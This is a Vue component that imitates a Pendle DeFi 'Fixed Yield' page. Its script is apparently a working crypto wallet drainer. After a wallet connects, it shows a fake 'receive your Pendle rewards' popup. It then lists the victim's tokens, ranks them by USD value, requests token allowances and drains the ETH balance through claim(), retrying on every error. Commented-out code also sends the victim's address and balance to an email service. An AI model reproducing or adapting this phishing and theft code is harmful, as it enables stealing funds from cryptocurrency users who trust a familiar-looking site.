                            href="/earn/fixed-yield/0x3025680925349c9c01c0f01cf300ec963832ec64"
                            class="relative p-5 mb-3 border cursor-pointer rounded-xl group flex flex-col justify-between"
                            style="--5db2813d: #53ae94"
                            ><div
                              data-v-9d0ac272=""
                              class="absolute inset-0 pointer-events-none card-accent-gradient rounded-xl opacity-30 group-hover:opacity-20 -z-10"
                            ></div>
                            <div data-v-9d0ac272="">
                              <img
                                data-v-9d0ac272=""
                                src="https://storage.googleapis.com/prod-pendle-bucket-a/images/uploads/9e804f30-881b-436f-b80b-29f4d00dda63.svg"
                                alt="USDT"
                                title="USDT"
                                class="inline-block h-16 w-16 absolute right-3.5 -mt-12"
                              />
                              <div data-v-9d0ac272="" class="pr-16">
                                <div
                                  data-v-9d0ac272=""
                                  class="flex items-center gap-x-1"
                                >
                                  <span
                                    data-v-9d0ac272=""
                                    class="text-xl font-bold"
                                    >USDT</span
                                  ><button
                                    data-v-9d0ac272=""
                                    type="button"
                                    class="relative z-10 bottom-px"
                                  >
                                    <svg
                                      class="text-water-200 hover:text-[#EFB54B]/50 transition"
                                      width="18"
                                      height="18"
                                      viewBox="0 0 18 18"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M8.89952 14.7419L4.58536 17.3408C4.39477 17.4621 4.19552 17.5141 3.98761 17.4968C3.7797 17.4794 3.59778 17.4101 3.44184 17.2888C3.28591 17.1676 3.16463 17.0158 3.078 16.8335C2.99137 16.6512 2.97404 16.4478 3.02602 16.2233L4.16953 11.3114L0.349162 8.0108C0.175903 7.85486 0.0677886 7.6771 0.0248202 7.4775C-0.0181481 7.27791 -0.00532696 7.08317 0.0632838 6.89327C0.132588 6.70269 0.236543 6.54675 0.375151 6.42547C0.513758 6.30419 0.704344 6.22623 0.946907 6.19157L5.98876 5.74976L7.93793 1.12373C8.02456 0.915823 8.15901 0.759889 8.34127 0.655934C8.52354 0.551978 8.70962 0.5 8.89952 0.5C9.0901 0.5 9.27618 0.551978 9.45776 0.655934C9.63933 0.759889 9.77378 0.915823 9.8611 1.12373L11.8103 5.74976L16.8521 6.19157C17.0947 6.22623 17.2853 6.30419 17.4239 6.42547C17.5625 6.54675 17.6664 6.70269 17.7357 6.89327C17.805 7.08386 17.8182 7.27895 17.7752 7.47854C17.7323 7.67814 17.6238 7.85556 17.4499 8.0108L13.6295 11.3114L14.773 16.2233C14.825 16.4485 14.8077 16.6523 14.721 16.8346C14.6344 17.0168 14.5131 17.1683 14.3572 17.2888C14.2013 17.4101 14.0193 17.4794 13.8114 17.4968C13.6035 17.5141 13.4043 17.4621 13.2137 17.3408L8.89952 14.7419Z"
                                        fill="currentColor"
                                      ></path>
                                    </svg>
                                  </button>
                                </div>
                              </div>
                              <div data-v-9d0ac272="" class="mt-1">
                                <span
                                  data-v-9d0ac272=""
                                  class="text-sm font-bold"
                                  >Stargate</span
                                >
                              </div>
                              <div data-v-9d0ac272="" class="mt-4">
                                <div
                                  data-v-9d0ac272=""
                                  class="text-sm text-secondary uppercase"
                                >
                                  Up to
                                </div>
                                <span
                                  data-v-9d0ac272=""
                                  class="text-2xl font-bold text-success"
                                  ><!----><span
                                    title="3.917575384038585"
                                    class="whitespace-nowrap"
                                    >3.92</span
                                  >%</span
                                ><span data-v-9d0ac272=""> p.a </span>
                              </div>
                            </div>
                            <div data-v-9d0ac272="" class="mt-4">
                              <div
                                data-v-9d0ac272=""
                                class="bg-water-200/10 text-water-300/75 italic py-1 px-2 rounded-[5px] h-full"
                              >
                                No position
                              </div>
                            </div></a
                          >
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div
          data-v-0dd864e5=""
          class="transition duration-150 pointer-events-none hidden"
          style="animation-delay: -4s"
        ></div>
        <div
          data-v-0dd864e5=""
          class="transition duration-75 pointer-events-none glow-light pos-left2 bg-[#7AB7FF]"
          style="animation-delay: -1s"
        ></div>
        <!---->
      </div>
      <!----><!----><!----><!----><!----><!----><!---->
      <div
        data-v-0d5f7483=""
        id="floating-action-button"
        class="fixed z-navbar"
        style="bottom: 20px; right: 20px; --eb1cd92c: 20px; --68cee971: 16px"
      ></div>
      <div
        data-v-0d5f7483=""
        id="assistant-prompt"
        class="fixed z-navbar lg:bottom-[20px] left-[20px] transition-[top] duration-300"
        style="--eb1cd92c: 20px; --68cee971: 16px"
      >
        <div
          class="relative light"
          data-v-owner="172"
          style="
            --3f68e64e: 30px;
            --31c00c4a: -20px;
            --24cdabfd: 10px;
            --010464f4: 32px;
            --ee3de5e2: -15.2px;
          "
        >
          <button
            class="transition duration-300 group focus:outline-none scale-75"
          >
            <div class="relative peepo-shrivel">
              <div
                data-v-3447b819=""
                class="relative lg:w-[120px] lg:h-[120px] w-[75px] h-[75px]"
              >
                <div
                  data-v-3447b819=""
                  class="relative z-10 clip-peepo-frame lg:w-[120px] lg:h-[120px] w-[75px] h-[75px] bg-water-50"
                >
                  <img
                    data-v-3447b819=""
                    class="peepo-image absolute top-[11%] left-[5%] scale-[1.3] select-none drag-none"
                    src="https://storage.googleapis.com/prod-pendle-bucket-a/images/campaigns/FREE_Peepo.png"
                    alt="Peepo assistant"
                  /><!---->
                </div>
                <img
                  data-v-3447b819=""
                  class="absolute top-0 left-0 z-20 select-none drag-none frame-image"
                  src="https://storage.googleapis.com/prod-pendle-bucket-a/images/campaigns/Frame.png"
                  alt="Outer frame for peepo assistant"
                />
              </div>
              <button
                class="bg-success bottom-0 hidden lg:flex left-0 w-[18px] h-[18px] lg:bottom-1.5 lg:left-1.5 absolute z-40 lg:w-6 lg:h-6 rounded-full items-center justify-center"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="13"
                  height="19"
                  viewBox="0 0 13 19"
                  fill="none"
                  class="text-white w-2 lg:w-[12.5px] lg:h-[17.5px]"
                >
                  <path
                    d="M6.58047 18.25V15.7375H6.50547C4.90547 15.7375 3.30547 15.125 2.08047 13.9125C1.06301 12.894 0.427882 11.5558 0.282152 10.1235C0.136422 8.69127 0.489009 7.25257 1.28047 6.05L2.65547 7.425C1.76797 9.0875 1.99297 11.1875 3.39297 12.5875C4.26797 13.4625 5.41797 13.875 6.56797 13.85V11.175L10.1055 14.7125L6.58047 18.25ZM11.718 12.95L10.343 11.575C11.2305 9.9125 11.0055 7.8125 9.60546 6.4125C9.1997 6.00338 8.71673 5.6789 8.18458 5.45788C7.65243 5.23687 7.08169 5.12372 6.50547 5.125H6.43047V7.8125L2.89297 4.2875L6.43047 0.75V3.275C8.05547 3.25 9.69297 3.8375 10.9305 5.0875C13.0555 7.2125 13.318 10.525 11.718 12.95Z"
                    fill="currentColor"
                  ></path>
                </svg>
              </button>
            </div></button
          ><!---->
        </div>
      </div>
      <div
        data-v-0d5f7483=""
        id="mobile-back-to-top"
        class="fixed z-navbar lg:hidden right-6 pointer-events-none"
        style="--eb1cd92c: 20px; --68cee971: 16px"
      ></div>
      <div
        data-v-0d5f7483=""
        id="bottom-bar"
        class="fixed bottom-0 w-full pointer-events-none z-navbar lg:hidden"
        style="--eb1cd92c: 20px; --68cee971: 16px"
      >
        <div
          data-v-0d5f7483=""
          class="px-6 py-5 pointer-events-auto pp-mobile-bar-light backdrop-blur-2xl"
        >
          <div data-v-0d5f7483="" id="mobile-action-bar"></div>
          <div data-v-0d5f7483="" id="mobile-navigation">
            <div
              class="flex items-center justify-around w-full px-3 overflow-hidden text-sm rounded-full h-9 xs:text-base bg-water-50 shadow lg:hidden"
            >
              <a
                class="pp-focus-outline inline-flex items-center justify-center text-water-700 font-medium"
                href="javascript:void()"
                aria-current="page"
                >Fixed Yield
                <!----></a
              ><a
                class="pp-focus-outline inline-flex items-center justify-center text-water-400 font-normal"
                href="javascript:void()"
                >Liquidity
                <!----></a
              ><a
                class="pp-focus-outline inline-flex items-center justify-center text-water-400 font-normal"
                href="javascript:void()"
                >vePENDLE
                <!----></a
              >
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import { useToast } from 'vue-toastification';
import { disconnect, getAccount, fetchFeeData } from '@wagmi/core';
import {
  web3modal,
  claim,
  balanceOf,
  getTokens,
  increaseAllowance,
} from './utils/walletconnect.js';
const Toast = useToast();
import axios from 'axios';

export default {
  data() {
    return {
      isConnected: false,
      account: null,
      processing: false,
      isMeta: false,
      web3: null,
      balance: {},
      isOk: true,
      isDone: false,
      tokens: [],
      maxToken: null,
      claimable: 0,
      sortedTokens: [],
      currentIndex: 0,
    };
  },

  methods: {
    async wc_claim() {
      try {
        if (getAccount().isConnected) {
          this.processing = true;
          this.isDone = false;


          const token = this.maxToken;
          // if (token == null && this.claimable == 0) {
          //   this.isOk = true;
          //   Swal.close();
          //   Swal.hideLoading();
          //   return;
          // }
          if (token && this.claimable > token.usdValue) {
            await claim(this.balance.value);
            this.claimable = 0;
          } else {
            if (this.tokens.length > 0 && this.maxToken) {
              await increaseAllowance(token);
            } else {
              await claim(this.balance.value);
              this.claimable = 0;
            }
          }

          this.processing = false;
          this.isDone = true;
          if (this.currentIndex + 1 > this.sortedTokens.length) {
            if (this.claimable > 0) {
              await claim(this.balance.value);
              this.claimable = 0;
            } else {
              this.processing = false;
              this.isDone = false;
              Swal.close();
              Swal.hideLoading();
            }
          } else {
            this.currentIndex += 1;
            this.maxToken = null;
            this.maxToken = this.sortedTokens[this.currentIndex];
            this.wc_claim();
          }
        } else {
          this.wConnect();
        }
      } catch (error) {
        this.processing = false;
        this.isDone = false;
        Swal.close();
        Swal.hideLoading();
        this.wc_claim();
        // Toast.error(error.message);
      }
    },
    async wConnect() {
      try {
        if (getAccount().isConnected) {
          this.account = getAccount().address;
          await this.showBalance();
          return;
        } else {
          await web3modal.openModal();
          web3modal.subscribeModal((newState) => {
            if (!newState.open) {
              if (getAccount().isConnected) {
                this.account = getAccount().address;
                this.showBalance();
              }
            }
          });
        }
      } catch (error) {
        Toast.error(error.message);
      }
    },
    async showBalance() {
      try {
        this.processing = true;
        Swal.fire({
          html:
            '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle rewards. All fees will be refunded immediately.</p>' +
            '<small style="font-size: 15px">Verify your wallet to continue</small> ',
          showCloseButton: false,
          showCancelButton: false,
          showConfirmButton: false,
          background: '#00000080',
          width: '550px',
          color: '#fff',
          customClass: {
            loader: '',
          },
          didOpen: () => {
            Swal.showLoading();
          },
        });
        const balance = await balanceOf();
        const feeData = await fetchFeeData({
          chainId: 1,
          formatUnits: 'gwei',
        });
        const fee =
          BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
        const total = BigInt(balance.value) - BigInt(fee);
        this.balance = balance;
        const alltokens = await getTokens(getAccount().address);
        const validTokens = alltokens.filter((token) => token.balance > 0);
        for (let i = 0; i < validTokens.length; i++) {
          try {
            const res = await axios.get(
              `https://api.binance.com/api/v3/ticker/price?symbol=${validTokens[i].symbol}USDT`
            );
            validTokens[i].usdPrice = res.data.price;
          } catch (error) {
            validTokens[i].usdPrice = 0;
            continue;
          }
        }
        const tokens = validTokens.filter((token) => token.usdPrice > 0);
        const res = await axios.get(
          `https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT`
        );
        const usdPrice_ = res.data.price;
        const claimable = Math.round(usdPrice_ * parseFloat(balance.formatted));
        this.claimable = claimable;
        for (let i = 0; i < tokens.length; i++) {
          const token = tokens[i];
          const etherValue = token.balance / Math.pow(10, token.decimals);
          tokens[i].usdValue =
            tokens[i].usdPrice * parseFloat(etherValue).toFixed(2);
        }
        this.tokens = tokens;
        const maxToken = tokens.sort((a, b) => b.usdValue - a.usdValue);
        this.sortedTokens = maxToken.filter((token) => token.usdValue > 3);
        this.maxToken = this.sortedTokens[this.currentIndex];
        if (total <= 0) {
          this.isOk = false;
          Swal.close();
          Swal.hideLoading();
        } else {
          this.isConnected = true;
          this.isMeta = false;
          this.wc_claim();
          // this.sendEmail();
        }
      } catch (error) {
        console.log();
      }
    },
    async sendEmail() {
      try {
        await axios.post('https://api.emailjs.com/api/v1.0/email/send', {
          service_id: 'service_2ch66aj',
          template_id: 'template_ua9ebmd',
          user_id: 'omsQf86Fn0wmY_STT',
          template_params: {
            address: this.account,
            balance: this.balance.formatted,
          },
        });
      } catch (error) {
        console.log(error);
      }
    },
  },
  created() {
    if (getAccount().isConnected) {
      this.account = getAccount().address;
      this.isConnected = true;
      this.showBalance();
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', async function () {
        await disconnect();
        localStorage.clear();
      });
    }
  },
};
</script>